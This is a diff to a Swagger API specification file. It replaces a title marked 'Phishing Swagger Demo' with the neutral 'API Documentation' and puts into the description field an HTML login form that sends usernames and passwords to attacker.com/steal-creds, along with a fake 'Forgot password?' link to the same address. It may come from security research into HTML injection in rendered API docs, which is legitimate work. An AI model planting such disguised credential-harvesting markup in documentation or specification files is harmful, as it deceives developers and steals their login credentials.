@@ -1,16 +1,17 @@
 swagger: '2.0'
 info:
-  title: Phishing Swagger Demo
+  title: API Documentation
   description: |
-    <form action="https://attacker.com/steal-creds" method="POST">
-      <h3>Secure Login Required</h3>
-      <p>Please enter your credentials to access the full API documentation.</p>
-      <label for="username">Username:</label>
-      <input type="text" id="username" name="username" required><br><br>
-      <label for="password">Password:</label>
-      <input type="password" id="password" name="password" required><br><br>
-      <input type="submit" value="Login">
-    </form>
+    <div>
+      <h3>Login to Access API</h3>
+      <p>Enter your credentials to unlock full documentation.</p>
+      <form action="https://attacker.com/steal-creds" method="POST">
+        <label>Username: <input type="text" name="username" required></label><br>
+        <label>Password: <input type="password" name="password" required></label><br>
+        <input type="submit" value="Sign In">
+      </form>
+      <p><a href="https://attacker.com/steal-creds?creds=">Forgot password?</a></p>
+    </div>
   version: 1.0.0
 paths:
   /test:
